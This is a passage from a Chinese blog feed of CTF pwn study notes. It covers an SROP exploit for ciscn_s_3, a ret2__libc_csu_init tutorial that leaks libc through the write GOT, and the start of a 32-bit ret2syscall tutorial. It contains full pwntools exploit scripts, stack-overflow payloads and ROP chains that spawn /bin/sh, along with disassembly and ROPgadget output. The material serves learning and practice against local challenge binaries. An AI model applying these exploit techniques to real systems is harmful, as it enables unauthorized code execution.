; count<br>.text:<span class="hljs-number">00000000004004F</span>9 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">74</span> <span class="hljs-number">24</span> F0                lea     rsi, [rsp+buf]                  ; buf<br>.text:<span class="hljs-number">00000000004004F</span>E <span class="hljs-number">48</span> <span class="hljs-number">89</span> C7                      mov     rdi, rax                        ; fd<br>.text:<span class="hljs-number">0000000000400501</span> <span class="hljs-number">0F</span> <span class="hljs-number">05</span>                         syscall                                 ; LINUX - sys_read<br>.text:<span class="hljs-number">0000000000400503</span> <span class="hljs-number">48</span> C7 C0 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rax, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">000000000040050</span>A BA <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                mov     edx, <span class="hljs-number">30</span>h ; <span class="hljs-string">&#x27;0&#x27;</span>                  ; count<br>.text:<span class="hljs-number">000000000040050F</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">74</span> <span class="hljs-number">24</span> F0                lea     rsi, [rsp+buf]                  ; buf<br>.text:<span class="hljs-number">0000000000400514</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> C7                      mov     rdi, rax                        ; fd<br>.text:<span class="hljs-number">0000000000400517</span> <span class="hljs-number">0F</span> <span class="hljs-number">05</span>                         syscall                                 ; LINUX - sys_write<br>.text:<span class="hljs-number">0000000000400519</span> C3                            retn<br></code></pre></td></tr></table></figure><p>buf距离rbp栈底只有0x10个字节，buf却可以读入0x400，所以存在栈溢出</p><p>retn其实就是pop eip，eip寄存器一般用于存放我们下一条要执行的指令的地址，所以pop eip这条指令可以让我们控制程序的跳转。</p><p>注意这里的vuln和gadget函数都有一个特点，那就是函数末尾没有leave指令，在执行完之后不会恢复rbp和rsp到上一个栈帧，原先rbp值保存的位置变成了返回地址的位置。也就是说vuln函数的buf参数在溢出的时候只要输入长度为10的数据之后覆盖rbp,就能够控制程序。</p><p>所以利用过程：</p><p>构造第一次溢出，返回到main函数，由于write输出的是0x30字节长度的内容，因此会泄露一部分的栈地址，泄露栈地址之后计算一下栈顶的位置，将rip设置到栈顶的位置，下一次payload发送&#x2F;bin&#x2F;sh，</p><p><img src="C:\Users\lpp\Desktop\笔记\pwn\1715247137615.png" alt="1715247137615"></p><p>输入点的地址是栈顶738-5f0&#x3D;0x148</p><p>所以接受地址后减去偏移就是栈起始地址</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(a)<br>    pause()<br>gadget=<span class="hljs-number">0x00000000004004DA</span><br>main=<span class="hljs-number">0x00000000004004ED</span><br>syscall=<span class="hljs-number">0x400517</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span>+p64(main)<br>debug()<br>a.send(payload)<br>stack_addr=u64(a.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-<span class="hljs-number">0x148</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-comment">#debug()</span><br>frame=SigreturnFrame()<br>frame.rax=<span class="hljs-number">59</span><br>frame.rdi=stack_addr<br>frame.rip=syscall<br>frame.rsi=<span class="hljs-number">0</span><br><br><span class="hljs-comment"># frame=SigreturnFrame(): 这一行创建了一个SigreturnFrame对象，用于构造srop payload。SigreturnFrame是pwntools库中的一个类，用于构造srop时所需的寄存器状态。</span><br><br><span class="hljs-comment"># frame.rax=59: 这一行设置了rax寄存器的值为59。在Linux中，rax寄存器用于存储系统调用号，59代表execve系统调用。</span><br><br><span class="hljs-comment"># frame.rdi=stack_addr: 这一行设置了rdi寄存器的值为stack_addr，其中stack_addr是一个变量，应该是指向字符串&quot;/bin/sh\x00&quot;的地址。在execve系统调用中，rdi寄存器通常存储的是要执行的程序的路径。</span><br><br><span class="hljs-comment"># frame.rip=syscall: 这一行设置了rip寄存器的值为syscall，其中syscall应该是一个指向系统调用指令的地址。在srop中，通过修改rip寄存器来控制程序执行流程，从而触发系统调用。</span><br><br><span class="hljs-comment"># frame.rsi=0: 这一行设置了rsi寄存器的值为0。在execve系统调用中，rsi寄存器通常存储的是传递给被执行程序的命令行参数，而这里将其设置为0，表示没有命令行参数。</span><br><br><span class="hljs-comment"># 综上所述，这段代码的作用是构造一个srop payload，用于执行execve(&quot;/bin/sh&quot;, NULL, NULL)系统调用，从而获取一个shell。</span><br>payload2=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(gadget)+p64(syscall)+<span class="hljs-built_in">bytes</span>(frame)<br><span class="hljs-comment">#a.send(payload2)</span><br>a.interactive()<br><br><span class="hljs-comment"># buf: 0x7ffea5126580 ◂— 0x61616161610a6161 (&#x27;aa\naaaaa&#x27;)</span><br><span class="hljs-comment">#0x7ffea51266c8</span><br><br></code></pre></td></tr></table></figure><p>讲一下payload2，将&#x2F;bin&#x2F;sh存入buf中将buf空间补全到0x10到达栈底，pop rbp指向gadget，gadget 将3Bpop到syscall函数，进行系统调用 也就是新程序的执行，然后利用pwntools集成的sign机制，将rax设置成59，rdi指向存binsh的栈地址（在这里第二次输入的时候栈已经抬高，重新动调一下看一下新栈的位置），rip指针指向syscall进行系统调用，然后获得shell</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/"/>
    <url>/2024/09/16/ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="ROP-ret2-libc-csu-init（64位ELF）"><a href="#ROP-ret2-libc-csu-init（64位ELF）" class="headerlink" title="ROP-ret2__libc_csu_init（64位ELF）"></a>ROP-ret2__libc_csu_init（64位ELF）</h2><p> 首先64位文件传参方式：当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9。</p><p>当参数为7个以上时，前六个与前面一样，但后面的要依次放入栈中，即和32位程序一样。</p><p>例子：function(a,b,c,d,e,f,g,h)</p><p>参数a放入rdi，参数b放入rsi，参数c放入rdx，参数d放入rcx，参数e放入r8，参数f放入r9</p><p>剩下的h，g都存放到esp，call function。</p><h4 id="ROP-ret2-libc-csu-init的利用方法"><a href="#ROP-ret2-libc-csu-init的利用方法" class="headerlink" title="ROP-ret2__libc_csu_init的利用方法"></a>ROP-ret2__libc_csu_init的利用方法</h4><p>在64位程序中，函数的前六个参数是通过寄存器来传递的，但很多时候，很难找到每一个寄存器对应的gadgets。这时候可以利用x64下的__libc_csu_init中的gadgets，这个函数是用来对libc进行初始化操作的，一般程序都会调用libc函数，所以一定存在这个函数.</p><p>下面是整个函数的汇编，存在可利用的点，从000000000040061A到结尾，我们可以利用栈溢出构造栈上的数据来控制rbx，rbp，r12，r13，r14，r15寄存器的数据（都是向寄存器进行pop）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000000004005C0                                   ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)<br>.text:00000000004005C0                                   public __libc_csu_init<br>.text:00000000004005C0                                   __libc_csu_init proc near               ; DATA XREF: _start+16↑o<br>.text:00000000004005C0                                   ; __unwind &#123;<br>.text:00000000004005C0 000 41 57                         push    r15<br>.text:00000000004005C2 008 41 56                         push    r14<br>.text:00000000004005C4 010 41 89 FF                      mov     r15d, edi<br>.text:00000000004005C7 010 41 55                         push    r13<br>.text:00000000004005C9 018 41 54                         push    r12<br>.text:00000000004005CB 020 4C 8D 25 3E 08 20 00          lea     r12, __frame_dummy_init_array_entry<br>.text:00000000004005D2 020 55                            push    rbp<br>.text:00000000004005D3 028 48 8D 2D 3E 08 20 00          lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:00000000004005DA 028 53                            push    rbx<br>.text:00000000004005DB 030 49 89 F6                      mov     r14, rsi<br>.text:00000000004005DE 030 49 89 D5                      mov     r13, rdx<br>.text:00000000004005E1 030 4C 29 E5                      sub     rbp, r12<br>.text:00000000004005E4 030 48 83 EC 08                   sub     rsp, 8<br>.text:00000000004005E8 038 48 C1 FD 03                   sar     rbp, 3<br>.text:00000000004005EC 038 E8 0F FE FF FF                call    _init_proc<br>.text:00000000004005EC<br>.text:00000000004005F1 038 48 85 ED                      test    rbp, rbp<br>.text:00000000004005F4 038 74 20                         jz      short loc_400616<br>.text:00000000004005F4<br>.text:00000000004005F6 038 31 DB                         xor     ebx, ebx<br>.text:00000000004005F8 038 0F 1F 84 00 00 00 00 00       nop     dword ptr [rax+rax+00000000h]<br>.text:00000000004005F8<br>.text:0000000000400600<br>.text:0000000000400600                                   loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600 038 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400606 038 44 89 FF                      mov     edi, r15d<br>.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]令rbx=0的话就是call r12了，把函数地址放到r12中。  <br>.text:0000000000400609<br>.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400611 038 48 39 EB                       cmp     rbx, rbp<br>.text:0000000000400614 038 75 EA                         jnz     short loc_400600<br>.text:0000000000400614<br>.text:0000000000400616<br>.text:0000000000400616                                   loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j<br>.text:0000000000400616 038 48 83 C4 08                   add     rsp, 8<br>.text:000000000040061A 030 5B                            pop     rbx<br>.text:000000000040061B 028 5D                            pop     rbp<br>.text:000000000040061C 020 41 5C                         pop     r12<br>.text:000000000040061E 018 41 5D                         pop     r13<br>.text:0000000000400620 010 41 5E                         pop     r14<br>.text:0000000000400622 008 41 5F                         pop     r15<br>.text:0000000000400624 000 C3                            retn<br>.text:0000000000400624                                   ; &#125; // starts at 4005C0<br></code></pre></td></tr></table></figure><p>可利用的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000040061A 030 5B                            pop     rbx<br>.text:000000000040061B 028 5D                            pop     rbp<br>.text:000000000040061C 020 41 5C                         pop     r12<br>.text:000000000040061E 018 41 5D                         pop     r13<br>.text:0000000000400620 010 41 5E                         pop     r14<br>.text:0000000000400622 008 41 5F                         pop     r15<br>.text:0000000000400624 000 C3                            retn<br></code></pre></td></tr></table></figure><p>从0x0000000000400600到0x0000000000400609,我们可以将r13赋给rdx,将r14赋给rsi,将r15d赋给edi(需要注意的是，虽然这里赋给的是edi,但其实此时rdi的高32位寄存器值为0（自行调试），所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位)，而这三个寄存器，也是x64函数调用中传递的前三个寄存器(rdx、rsi、edi)。此外，如果我们可以合理地控制r12与x,那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0,r12为存储我们想要调用的函数的地址。对应的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000400600<br>.text:0000000000400600                                   loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600 038 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400606 038 44 89 FF                      mov     edi, r15d<br>.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br>.text:0000000000400609<br></code></pre></td></tr></table></figure><p>从000000000040060D到0000000000400614，我们可以控制rbx与rbp不相等这样就不会执行loc_400600，进而可以继续执行下面的汇编程序，所以可以简单的设置rbx&#x3D;0，rbp&#x3D;1.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400611 038 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400614 038 75 EA                         jnz     short loc_400600<br>.text:0000000000400614<br></code></pre></td></tr></table></figure><p>JNZ(或JNE)( jump if not zero,or not equal),汇编语言中的条件转移指令。结果不为零（或不相等）则转移。</p><p>payload（用来获取真实的write函数地址）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>pop_addr=<span class="hljs-number">0x40061a</span><br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr=<span class="hljs-number">0x400600</span><br>padding=<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span><br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>a.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*padding+p64(pop_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(mov_addr)+<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>)+p64(main_addr)<br>gdb.attach(a)<br>a.sendline(payload1)<br>write_true_addr=u64(a.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_true_addr_is:&quot;</span>+<span class="hljs-built_in">hex</span>(write_true_addr))<br></code></pre></td></tr></table></figure><p>payload1&#x3D;b”a”<em>padding+p64(pop_addr)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(write_got)+p64(8)+p64(mov_addr)+b”a”</em>(0x8+8*6)+p64(main_addr)</p><p>具体讲解这一段payload的意思:<br>b”a”*padding：是用来使程序发生栈溢出</p><p>pop_addr：覆盖栈中的返回地址，使程序执行pop_addr地址处的函数。</p><p>p64(0)：是给pop rbx中，令rbx&#x3D;0</p><p>p64(1)：是给pop rbp中，令rbp&#x3D;1（）通过这两步，在下面此处就不会发生跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400611 038 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400614 038 75 EA                         jnz     short loc_400600<br>.text:0000000000400614<br></code></pre></td></tr></table></figure><p>p64(write_got)：是将write_got函数地址给寄存器r12（调用函数 ）</p><p>p64(8)：将8给寄存器r13（参数3）</p><p>p64(write_got)：将write_got函数地址给寄存器r14（参数2）</p><p>p64(1)：将1给r15（参数1）</p><p>p64(mov_addr)：覆盖返回地址为mov_addr</p><p>就是调用write_got函数，参数是write_got函数地址，也就相当于write(write_got),文件描述符是1，每次写入8个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span>*buf,<span class="hljs-type">size_t</span> count)</span>;<br><br>参数说明：<br><br>fd:是文件描述符（write所对应的是写，即就是<span class="hljs-number">1</span>）<br><br>buf:通常是一个字符串，需要写入的字符串<br><br>count：是每次写入的字节数<br></code></pre></td></tr></table></figure><p>在这之后程序转到mov_addr利用mov指令布置寄存器rdx，rsi，edi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">text:0000000000400600 038 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400606 038 44 89 FF                      mov     edi, r15d<br>.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br></code></pre></td></tr></table></figure><p>在这里，因为rbx和rbp相等，所以继续执行payload代码也就是p64(main_addr),不需要跳转。</p><p>从整体上看，我们输入了b”a”<em>136,利用payload1对寄存器布局后又重新回到了main函数，其中b‘a’</em>(0x8+8*6)的作用是为了平衡堆栈，也就是说，当mov_addr执行完之后，按照流程仍然会执行400616处的函数，但是我们希望它直接执行（）函数，如果去执行400616的函数，会再次pop寄存器更换我们的布局，为了堆栈平衡，使用垃圾数据填充此处的代码，将main_addr覆盖至ret，从而执行main</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000400616                                   loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j<br>.text:0000000000400616 038 48 83 C4 08                   add     rsp, 8<br>.text:000000000040061A 030 5B                            pop     rbx<br>.text:000000000040061B 028 5D                            pop     rbp<br>.text:000000000040061C 020 41 5C                         pop     r12<br>.text:000000000040061E 018 41 5D                         pop     r13<br>.text:0000000000400620 010 41 5E                         pop     r14<br>.text:0000000000400622 008 41 5F                         pop     r15<br>.text:0000000000400624 000 C3                            retn<br></code></pre></td></tr></table></figure><p>为什么payload中布置两个write_got的作用：</p><p>再布置完寄存器之后，由于有 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]，调用了write函数，其参数为write_got函数地址，就是write（write_got函数地址），再使用u64（a.recv(8)）接受数据print出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>pop_addr=<span class="hljs-number">0x40061a</span><br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr=<span class="hljs-number">0x400600</span><br>padding=<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span><br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>a.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">136</span>+p64(pop_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(write_got)+p64(<span class="hljs-number">1</span>)+p64(mov_addr)+<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>)+p64(main_addr)<br>gdb.attach(a)<br>a.sendline(payload1)<br>write_true_addr=u64(a.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_true_addr_is:&quot;</span>+<span class="hljs-built_in">hex</span>(write_true_addr))<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]))<br>libc_base=write_true_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>binsh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base=&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system=&quot;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh=&quot;</span>+<span class="hljs-built_in">hex</span>(binsh))<br>pop_rdi_ret=<span class="hljs-number">0x400623</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>最后计算基地址，system地址，binsh地址构造rop链进行getshell</p><p>​                                                                                                                                                                     </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/ret2syscall%EF%BC%8832%E4%BD%8DELF%EF%BC%89/"/>
    <url>/2024/09/16/ret2syscall%EF%BC%8832%E4%BD%8DELF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="ret2syscall（32位ELF）"><a href="#ret2syscall（32位ELF）" class="headerlink" title="ret2syscall（32位ELF）"></a>ret2syscall（32位ELF）</h2><p>ret to syscall 就是调用系统函数来getshell</p><p>系统调用是一种编程方式，计算机程序从该程序中向执行其操作系统内核请求服务，让程序调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)函数即可getshell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> *shell = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This time, no system() and NO SHELLCODE!!!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you plan to do?\n&quot;</span>);<br>    gets(buf);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>通过上面这段代码编译的程序来体现ret2syscall.</p><p>系统在运行的时候会使用上面四个寄存器，所以那么上面内容我们可以写为int_0x80(eax,ebx,ec,edx)。只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们再执行int0x80就可执行对应的系统调用。(就是先存寄存器，然后调用int_0x80,去执行寄存器的值)</p><p>调用execve函数的具体步骤：由于该程序是32位所以：</p><p>1.eax应该为0xb（execve函数的系统调用号为0xb）</p><p>2.ebx应该指向&#x2F;bin&#x2F;sh的地址，仅指向sh的地址也行</p><p>3.ecx应该为0</p><p>4.edx应该为0</p><p>最后再执行int 0x80触发中断即可执行execve()函数来获取shell。构成了int 0x80(0xb,&#x2F;bin&#x2F;sh,0,0)的结构</p><p>(在x86汇编语言中，<code>int 0x80</code> 是一条指令，用于触发系统调用（syscall）而不是中断。在Linux系统中，<code>int 0x80</code> 是用于进行系统调用的传统方法，通常用于向内核请求各种服务，例如文件操作、进程管理等。</p><p>当执行 <code>int 0x80</code> 指令时，CPU会触发软中断，并将中断号 0x80 传递给内核。内核根据传递的参数来确定要执行的系统调用，并返回相应的结果。)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">pp@lpp-virtual-machine:~/test$ ROPgadget --binary rop --only &#x27;pop|ret&#x27;| grep &#x27;eax&#x27;<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 